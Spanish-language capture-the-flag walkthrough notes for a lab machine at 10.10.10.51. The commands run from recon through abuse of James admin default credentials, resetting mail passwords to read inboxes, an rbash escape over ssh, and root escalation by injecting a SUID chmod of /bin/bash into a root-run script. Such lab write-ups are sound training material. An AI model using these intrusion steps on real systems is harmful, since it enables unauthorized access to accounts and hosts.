## Summary

- IP -> 10.10.10.51
- Ports -> TCP (22, 25, 80, 110, 119, 4555), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> SSH 7.4p1 launchpad -> Para ver que distribucion de Linux es
    - 25 -> smtp
    - 80 -> http launchpad -> Para ver que distribucion de Linux es
    - 4555 -> rsip


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
- Comando -> **nc 10.10.10.51 4555** Nos conectamos al puerto 4555 por netcat, nos muestra un James Remote Administratio Tool 2.3.2, el cual podemos encontar sus default passwd en Internet, este es un servico Apache
- Comando -> **telnet 10.10.10.51 4555** Nos conectamos al puerto 4555 por Telnet y proporcionamos el usuario y passwd por defaul que es root, root
	- **>help**  Nos lista los comandos
	- **>listusers** Listamos los usuarios existentes
	- **>setpassword** Le podemos cambiar el passwd a un usuario existente y asi podernos conectar despues a su correo, por el puerto 110 que tenemos abierto
	- **>quit** Nos salimos del servidor RSIP

- Comando -> **telnet < IP> 110** Nos conectamos a POP3 por medio de Telnet, con un usuario y passwd. 
Comandos cuando nos conectamos
- **USER < Name>** Nombre del usuario a conectar
- **PASS < PASSWD>** Passwd del usuario a conectar 
- **>LIST** Miramos si tiene algun correo y debemos ver minimo **1** 10, por lo que no debemos de ver 0 0 ya que eso dice que no tiene correo 
- **>RETR < NUM>** Le pasamos el primer numero que hayamos encontrado anteriormente y listamos los mensajes que tenga en su bandeja de entrada, si encontramos un **2** quiere decir que hay dos correos, por lo que podemos poner primero **1** y despues el **2** y asi sucesivamente.
- **>QUIT** Nos salimos del servidor POP3

## User
- Comando -> **sshpass -p <'PASSWORD'> ssh < USER>@< IP>** Conectarnos por ssh  y obtenemos acceso al sistema
Buscamos la flag de user.txt en el directorio

Nos damos cuenta que estamos en una restricted bash. (rbash)
- Comando -> **echo $PATH** Miramos el path de la consola Linux
- Comando -> **ls bin/** Para ver que comandos podemos ejecutar 

Cuando estamos en una restricted bash (rbash) podemos meter comandos en el ssh, esto si la restricted bash esta mal configurada:
- Comando -> **ssh < USER>@< IP> < COMMAND>** Conectarnos por ssh , pero antes nos ejecuta un comando, en este caso podemos hacer que nos de una bash. 
	- **bash** -> Podemos colocar bash como comando, podremos interactuar aunque no nos de una pseudo-consola. Pero podemos hacerle el tratamiento y nos dara una:
		- Tratamiento de la consola Linux cuando entras a una maquina victima
			 - **Script /dev/null -c bash** 
			 - **Ctrl + z**
			 - **stty raw -echo; fg**
			 -  **reset xterm**
			- **export TERM=xterm** Para poder hacer Ctrl +c y Ctrl + l (l=ele)
			- **export SHELL=/bin/bash**Hacemos que shell ahora valga bash

Ahora para modificar las dimensiones de nano debemos hacer lo siguiente.
**stty size** Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano

## Root
- Comando -> **sudo -l** Ver que permisos tenemos en el sudoers (l=ele)
- Comando -> **find / -perm -4000 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios
- Comando -> **which getcap** Para ver si esta instalado el Getcap y mirar las capabilities

Cambiamos el Path a uno mas grande, colocando el de nuestra maquina.

Como no obtenemos nada, haremos un archivo .sh para poder ver si hay algun servicio que nos pueda ayudar a escalar privilegios 
- **/dev/shm** Directorio con capacidad de escritura

- Comando -> **nano file.sh**
	#!/bin/bash
	
	function ctrl_c(){
		echo -e "\\n[!] Saliendo \\n"
		tput cnorm; exit 1
	}
		
	\# Ctrl + c
	trap ctrl_c INT
	tput civis
	old_process="\$(ps -eo command)"

	while true; do
		new_process="\$(ps -eo command)"
		diff <(echo "\$old_process") <(echo "\$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker
		old_process=\$new_process
	done	

El comando ps nos permite detectar todos los comandos y procesos que se estan ejecuatndo en el sistema

- Comando -> **chmod +x < FILE>** Le cambiamos los permisos a un archivo (r=read, w=write, x=execution, u=user, g=grupo, o=other)

Despues encontramos un archivo que lo esta ejecutando root y otros lo pueden modificar 
- Comando -> **nano /opt/tmp.py**
	os.system('chmod u+s /bin/bash')

Para ir monitoreando el comando hacemos lo siguiente:
- Comando -> **watch -n 1 ls -l /bin/bash** Monitoreamos el comando /bin/bash

Modificando esa parte le diremos que otorgue el privilegio usid a la bash, para que cuando lo ejecute le pondra el s asi: -rw**s**r-xr-x root root 

- Comando -> **bash -p** Para ejecutar la bash con privilegios (p=priviledge) y atentara contra el propietario root

Ahora solo buscamos la flag root.txt